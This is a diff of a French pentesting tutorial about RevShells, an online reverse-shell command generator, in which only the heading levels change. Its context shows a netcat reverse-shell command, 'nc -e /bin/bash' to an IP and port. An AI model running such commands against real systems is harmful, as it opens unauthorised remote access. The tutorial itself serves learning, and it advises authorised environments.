@@ -1,12 +1,12 @@
 # Shells et Reverse Shells
 
-#### **Tuto RevShells : Générateur de Reverse Shells en ligne**
+### **Tuto RevShells : Générateur de Reverse Shells en ligne**
 
 RevShells est un outil en ligne qui aide à générer des commandes de reverse shells adaptées à différents environnements et langages. Il est particulièrement utile pour les tests de pénétration ou les exercices de cybersécurité.
 
 ***
 
-#### **Fonctionnalités principales :**
+### **Fonctionnalités principales :**
 
 * Génération rapide de commandes de reverse shells compatibles avec divers langages (Bash, Python, PHP, PowerShell, etc.).
 * Paramétrage simple avec l'adresse IP et le port cible.
@@ -15,7 +15,7 @@ RevShells est un outil en ligne qui aide à générer des commandes de reverse s
 
 ***
 
-#### **Comment utiliser RevShells :**
+### **Comment utiliser RevShells :**
 
 1. **Accéder au site :**
    * Rendez-vous sur [RevShells](https://www.revshells.com/).
@@ -45,7 +45,7 @@ RevShells est un outil en ligne qui aide à générer des commandes de reverse s
 
 ***
 
-#### **Exemples de commandes générées :**
+### **Exemples de commandes générées :**
 
 **1. Bash Reverse Shell :**
 
@@ -73,7 +73,7 @@ nc -e /bin/bash 10.10.10.10 4444
 
 ***
 
-#### **Bonnes pratiques :**
+### **Bonnes pratiques :**
 
 * **Test en environnement contrôlé** : Utilisez toujours les reverse shells dans un environnement d'apprentissage ou autorisé.
 * **Configurer le pare-feu local** : Assurez-vous que le port spécifié est ouvert sur votre machine attaquante.
